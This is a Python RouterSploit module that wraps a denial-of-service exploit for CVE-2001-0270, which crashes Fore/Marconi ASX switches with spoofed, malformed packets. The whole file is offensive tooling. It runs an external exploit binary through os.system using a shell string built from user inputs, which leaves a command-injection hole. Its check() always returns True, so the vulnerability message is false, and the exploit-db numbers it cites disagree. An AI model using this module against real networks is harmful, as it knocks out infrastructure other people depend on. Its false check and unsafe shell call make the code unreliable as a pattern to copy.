
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2001-0270",

        "description": "This DoS attack was discovered by Keith Pachulski and written by J.K.  "
                       "Garvey. This simple program sets the SYN, FIN and More Fragment bits and  "
                       "sends this crafted packet from a spoofed host to a destined Fore/Marconi ASX switch, which causes it to crash ",

        "authors": (

            "J.K. Garvey",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/20644",

        ),

        "devices": (

            "Marconi, CVE-2001-0270"
        ),
    }


    target = OptIP("", "destination host ip")
    srcip = OptIP("","source host ip")
    port = OptPort("", "destination port")
    
    def run(self):

        if self.check():
            s = "./exploit-db-20664 -s {0} -d {1}"
            if self.port:
                s += " -p {2}"

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format(self.srcip,self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True